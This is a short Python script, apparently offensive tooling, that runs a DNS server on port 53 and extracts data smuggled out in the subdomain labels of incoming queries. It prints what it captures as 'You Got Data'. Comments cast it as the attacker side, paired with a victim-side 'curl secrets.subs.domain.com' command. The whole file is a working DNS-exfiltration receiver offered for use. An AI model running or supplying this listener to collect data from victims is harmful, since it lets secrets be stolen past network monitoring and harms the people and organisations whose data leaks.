#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import re
import binascii
from dnslib import DNSRecord

# Attacker: sudo python3 dnsserv.py
# Victim:   curl secrets.subs.domain.com

# IP and Port to listen on
UDP_IP = "0.0.0.0"
UDP_PORT = 53

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((UDP_IP, UDP_PORT))

# Listen for incoming DNS requests
while True:
    # Receive data from the socket
    byteData, addr = sock.recvfrom(2048)  # buffer size is 2048 bytes
    try:
        # Convert byte data to a hex string and then back to bytes
        msg = binascii.unhexlify(binascii.b2a_hex(byteData))
        
        # Parse the DNS message
        msg = DNSRecord.parse(msg)
    except Exception as e:
        # Print any errors during message processing
        print(e)
        continue

    # Regex search for the specific domain pattern in the DNS message
    m = re.search(r';(\S+)\.<sub-domain>\.<domain>\.com', str(msg), re.MULTILINE)
    
    # If a match is found, print the extracted data
    if m:
        print('You Got Data:', m.group(1))
